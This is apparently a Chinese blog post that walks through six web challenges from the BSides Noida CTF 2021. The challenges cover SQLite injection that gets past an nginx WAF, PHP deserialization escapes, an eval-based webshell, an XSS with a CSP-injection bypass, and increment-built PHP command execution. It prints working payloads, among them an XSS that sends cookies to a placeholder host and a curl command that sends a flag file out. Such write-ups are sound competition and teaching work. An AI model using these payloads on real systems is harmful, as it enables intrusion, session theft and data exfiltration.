---
title: BSides Noida CTF 2021 WriteUp Web部分
date: 2021-08-09 10:29:48
categories:
- CTF
tags:
- sql-injection
- xss
- csp-bypass
- command-execute
index_img: /img/CTF_index.png
banner_img: /img/BSides_Noida_CTF_banner.png
toc: true
---





# BSides Noida CTF 2021 WriteUp Web部分

## 总结

- php参数解析方式绕过nginx waf
- sqlite 注入。
- xss csp script-src-attr 绕过。 
- php 反序列化逃逸。
- php 命令执行自增法绕过。

[比赛链接](https://ctf.bsidesnoida.in/challs)

## Web1 baby_web 

赛题给了源码以及链接。

输入框中可以输入数字，可以看到通过 $_GET 进行传入，很典型的 SQL 注入场景。

![image-20210809135357316](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135357316.png)

我们看一下源码，里面给出了 Dockerfile。

![image-20210809135505307](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135505307.png)

主要的代码逻辑在于 index.php。

```php
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

class MyDB extends SQLite3 {
    function __construct() {
        $this->open('./karma.db');
    }
}

$db = new MyDB();
if (!$db) {
    echo $db->lastErrorMsg();
} else {

    if (isset($_GET['chall_id'])) {
      $channel_name = $_GET['chall_id'];
    $sql = "SELECT * FROM CTF WHERE id={$channel_name}";
    $results = $db->query($sql);
    while($row = $results->fetchArray(SQLITE3_ASSOC) ) {
    echo "<tr><th>".$row['id']."</th><th>".$row['title']."</th><th>".$row['description']."</th><th>".$row['category']."</th><th>".$row['author']."</th><th>".$row['points']."</th></tr>";
    }  
    }else{
      echo "<tr><th>-</th><th>-</th><th>-</th><th>-</th><th>-</th><th>-</th></tr>";
    }
    
}
?>
```

很典型的 SQL 注入。但是事情并没有那么简单。尝试输入任何非数字字符时都会跳转到 error.html。

![image-20210809135714044](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135714044.png)

显然有waf，但是没有别的 php 文件，查看 config 下的 ctf.conf 后发现了过滤手段。

```nginx
	if ($args ~ [%]){
        	return 500;
        }

        if ( $arg_chall_id ~ [A-Za-z_.%]){
		return 500;
	}
```

如果参数 chall_id 被后面的正则匹配到了，就返回 500 ，跳转到 error.html。想要绕过后面的正则基本不可能。这时候应该找找别的办法，什么情况下 nginx 解析到的参数名能与 php 解析到的不同呢？顺着这个思路，想起来了[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)

> **我们知道PHP将查询字符串（在URL或正文中）转换为内部`$_GET`或的关联数组`$_POST`。例如：`/?foo=bar`变成`Array([foo] => "bar")`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。如果一个`IDS/IPS`或`WAF`中有一条规则是当`news_id`参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：**
>
> ```
> /news.php?%20news[id%00=42"+AND+1=0--
> ```
>
> %20与%00也不一定要加。
>
> |  User input   | Decoded PHP | variable name |
> | :-----------: | :---------: | :-----------: |
> | %20foo_bar%00 |   foo_bar   |    foo_bar    |
> | foo%20bar%00  |   foo bar   |    foo_bar    |
> |   foo%5bbar   |   foo[bar   |    foo_bar    |

除此之外，所有参数不能带有`%，因此相当于过滤了空格，我们可以使用`/**/`代替，所以我们可以构造这样的语句：

所以下面我们可以直接用。

```
http://ctf.babyweb.bsidesnoida.in/?chall[id=1/**/order/**/by/**/5
```

order by 7 时出现报错，说明字段为 6 。

```
http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select),4,5,6
```

后面就是 sqlite 注入，sqlite 注入可以参考：[Sqlite注入的一点总结](https://lanvnal.com/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/)

> 从sqlite_master查表名:
>
> ```sql
> sqlite> select tbl_name from sqlite_master where type='table';
> ```
>
> 获取表名和列名：
>
> ```sql
> sqlite> select sql from sqlite_master where type='table';
> ```
>
> 查版本：
>
> ```
> sqlite_version();
> ```

这里过滤了 `%`，所以像下面这样查表名，单引号会被拦截。

```
http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/tbl_name/**/from/**/sqlite_master/**/where type='table'),4,5,6
```

我们可以使用 limit 逐个查看。

```sql
http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/tbl_name/**/from/**/sqlite_master/**/limit/**/0,1),4,5,6

http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/tbl_name/**/from/**/sqlite_master/**/limit/**/1,1),4,5,6

http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/tbl_name/**/from/**/sqlite_master/**/limit/**/2,1),4,5,6
```

![image-20210809143253279](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143253279.png)

得到 flagss 表。然后查询字段。

```
http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/sql/**/from/**/sqlite_master/**/limit/**/2,1),4,5,6
```

![image-20210809143447236](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143447236.png)

所以实际上前面不查询表名也可以。这里一样会回显出来。

```
http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/flag/**/from/**/flagsss),4,5,6
```

![image-20210809143558681](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143558681.png)



这道题也有非预期，直接访问 karma.db 既可得到 flag 。。

![image-20210809162421050](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162421050.png)

## Web2 wowooo

```php
<?php
include 'flag.php';
function filter($string){
    $filter = '/flag/i';
    return preg_replace($filter,'flagcc',$string);
}
$username=$_GET['name'];
$pass="V13tN4m_number_one";
$pass="Fl4g_in_V13tN4m";
$ser='a:2:{i:0;s:'.strlen($username).":\"$username\";i:1;s:".strlen($pass).":\"$pass\";}";

$authen = unserialize(filter($ser));

if($authen[1]==="V13tN4m_number_one "){
    echo $flag;
}
if (!isset($_GET['debug'])) {
    echo("PLSSS DONT HACK ME!!!!!!").PHP_EOL;
} else {
    highlight_file( __FILE__);
}
?>
<!-- debug -->
```

反序列化逃逸。

`payload`:

```
flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}}}
```

![image-20210809143840587](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143840587.png)



## Web3 freepoint

也是一道反序列化的题，给了源码：

```php
 <?php

include "config.php";
function filter($str) {
    if(preg_match("/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\'[a-z]|\"[a-z0-9]/i",$str)) {
        return false;
    } else {
        return true;
    }
}
class BSides {
    protected $option;
    protected $name;
    protected $note;

    function __construct() {
        $option = "no flag";
        $name = "guest";
        $note = "flag{flag_phake}";
        $this->load();
    }

    public function load()
    {
        if ($this->option === "no flag") {
            die("flag here ! :)");
        } else if ($this->option === "getFlag"){
            $this->loadFlag();
        } else {
            die("You don't need flag ?");
        }
    }
    private function loadFlag() {
        if (isset($this->note) && isset($this->name)) {
            if ($this->name === "admin") {
                if (filter($this->note) == 1) {
                    eval($this->note.";");
                } else {
                    die("18cm30p !! :< ");
                }
            }
        }
    }

    function __destruct() {
        $this->load();
    }
}

if (isset($_GET['ctf'])) {
    $ctf = (string)$_GET['ctf'];
    if (check($ctf)) { //check nullbytes
        unserialize($ctf);
    }
} else {
    highlight_file(__FILE__);
}
?>

```

最开始想绕过对字母数字的过滤，构造 `("%01%01%01%04%01%01"|"%72%78%72%70%64%6c")("%04%01"|"%68%72")`，没法成功，应该是`check`将不可见字符过滤掉了。

后面发现上面的正则是个幌子。字母数字前后加了引号。所以我们可以直接通过如下payload绕过。

```php
<?php

class BSides {
    protected $option = "getFlag";
    protected $name = "admin";
    protected $note = 'eval(urldecode("%70%68%70%69%6e%66%6f%28%29%3b"))';

}

// echo urlencode("phpinfo();"),"\n";
$a = new BSides();
echo urlencode(serialize($a));
```

这样，引号与字母中间有一个 % ，就可以绕过了。本地是成功的，但是远程不成功。问题出在 check函数上。给的注释是：`//check nullbytes`。

![image-20210809150857060](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809150857060.png)



应该是将 protected 但序列化后的 %00 过滤掉了。所以我们在这里将 protected 改成 public，反序列化也是可以成功的。

```php
<?php

class BSides {
    public $option = "getFlag";
    public $name = "admin";
    public $note = 'eval(urldecode("%70%68%70%69%6e%66%6f%28%29%3b"))';

}

// echo urlencode("phpinfo();"),"\n";
$a = new BSides();
echo urlencode(serialize($a));
```

![image-20210809151137509](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151137509.png)



```php
eval(urldecode("%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%31%5d%29%3b")) # system($_GET[1]);
```

在 /home 目录下找到 flag 文件。

![image-20210809151726088](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151726088.png)

## Web4 Basic Notepad

注册并登陆进去之后是一个留言板，肯定是考xss了。

![image-20210809152433905](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152433905.png)



可以编辑内容，点击 review 就可以再次检查。

抓包可以看到有个 msg 参数。cookie 里有个 auth。

![image-20210809152402455](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152402455.png)



点击下方的 share with admin 估计就能把内容发送给管理员。

![image-20210809152529819](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152529819.png)

插入一些 js 代码。

![image-20210809154321598](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154321598.png)

但是是执行不了的。

![image-20210809154620275](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154620275.png)

抓包可以看到参数 token

![image-20210809204000548](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204000548.png)



```http
Content-Security-Policy: script-src 'none'; object-src 'none'; base-uri 'none'; script-src-elem 'none'; 
```

都是 none ，没有任何弱点。

但是我们看到 token 是拼接到了 CSP中。

![image-20210809204517851](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204517851.png)

所以我们可以控制 CSP。

在 token 末尾 加入 `; script-src-attr 'unsafe-inline'`

![image-20210809204628944](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204628944.png)

下面就可以使用 window.location 进行绕过了。

先试一下 `alert`。

```js
<img src=# onerror=alert(1)>
```

在 token 处加入 url 编码的 `; script-src-attr 'unsafe-inline'`。

![image-20210810121350236](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121350236.png)

下面就可以拿 cookie 了。

```js
<img src=# onerror='fetch("http://xxxx:8000/?cookie=" + encodeURI(document.cookie))'>
```

![image-20210810121729367](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121729367.png)

拿到 cookie ：`YWRtaW46djNyeTUzY3IzdFA0c3N3MHJkZGRk`

解码为 `admin:v3ry53cr3tP4ssw0rdddd`

修改 cookie 后进入。

![image-20210810121958596](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121958596.png)







## Web5 Baby Web Revenge

sqlite 注入 nginx waf 好像和上一个一样？？？只是换了一下表名。

```
http://ctf.babywebrevenge.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/sql/**/from/**/sqlite_master/**/limit/**/1,1),4,5,6
```

![image-20210809162553964](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162553964.png)

```
http://ctf.babywebrevenge.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/flag/**/from/**/therealflags),4,5,6
```

![image-20210809162638867](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162638867.png)



## Web6 Calculate

```php
<?php
error_reporting(0);
include "config.php";

if (isset($_POST['VietNam'])) {
    $VN = $_POST['VietNam'];
    if (filter($VN)) {
        die("nope!!");
    }
    if (!is_string($VN) || strlen($VN) > 110) {
        die("18cm30p ??? =)))");
    }
    else {
        $VN = "echo ".$VN.";";
        eval($VN);
    }
} else {
    if (isset($_GET['check'])) {
        echo phpinfo();
    }
    else {
        highlight_file(__FILE__);
    }
}
?>
```

加上参数 check 可以查看 phpinfo，几乎把所有的函数都给过滤了，经过 fuzz 后发现没有过滤 exec。

![image-20210809163006394](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809163006394.png)

访问 config.php 可以看到提示：

![image-20210809162810614](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162810614.png)



```php
<?php
if(isset($_GET['🐶'])) {
    highlight_file(__FILE__);
}
function filter($payload) {
    if (preg_match("/[a-zA-BD-Z!@#%^&*:'\"|`~\\\\]|3|5|6|9/",$payload)) {
        return true;
    }
}
?>
<!-- ?🐶 --> 
```

过滤了字母数字可以考虑用不可见字符，但是这里过滤了位运算符、取反，没有过滤小括号，可以使用函数、没有过滤`$`、`+`、`=`、大写的C、下划线、数字1,2等，可以考虑自增运算构造 webshell。

```php
<?php
# ${_GET}{1}(${_GET}{2}) 传入 1=system 2=ls

$_=C;
$_++;$_++;
$__=$_; #E
$_++;$_++; # G
$___=$_;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # T
$_=_.$___.$__.$_; #_GET
${$_}{1}(${$_}{2});

```

将 payload 链接成一串。最后的 `;`需要去掉。

```php
1;$_=C;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_++;$_=_.$___.$__.$_;${$_}{1}(${$_}{2})
```

url 编码后传入。

但是触发了 `strlen($VN) > 110`。

![image-20210809165321105](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809165321105.png)



中间获取字母 T 太长了，可以利用 php 中构造 NAN 来获取 N，再进行自增获取 T。

```php
<?php
$_=C;
$_++;
$C=++$_;
$_++;$_++;
$C_=$_;
$_=(C/C.C)[0];
$_++;$_++;$_++;$_++;$_++;
$_=_.$C_.$C.++$_;
${$_}{1}(${$_}{2});
```

- `$_=(C/C.C)[0]`的原理是，C/C得到 NAN ，然后连接C使得转化为字符串 NANC，这样才能获取到第0个元素。
- 为了尽量减小 payload 长度，还需要把变量名尽可能缩小。

最终 payload：

```php
$_=C;$_++;$C=++$_;$_++;$_++;$C_=$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;${$_}{1}(${$_}{2})
# urlencode
%24_%3DC%3B%24_%2B%2B%3B%24C%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24C_%3D%24_%3B%24_%3D%28C%2FC.C%29%5B0%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24C_.%24C.%2B%2B%24_%3B%24%7B%24_%7D%7B1%7D%28%24%7B%24_%7D%7B2%7D%29%3B
```

```
1=exec&2=curl xxx.xxx.xxx.xxx:xxx -d "`cat /home/fl4g_h1hih1i_xxx.txt`"
```

记得url编码。

![image-20210809222814196](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809222814196.png)



# 参考链接

- [BSides Noida CTF 2021 Web WriteUp](https://whoamianony.top/2021/08/08/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/BSides%20Noida%20CTF%202021/)
- [BSides Noida CTF 2021 Writeups](https://blog.hamayanhamayan.com/entry/2021/08/09/010725)
- [BSides Noida CTF 2021 Basic Notepad writeup](https://hi120ki.github.io/blog/posts/20210808/)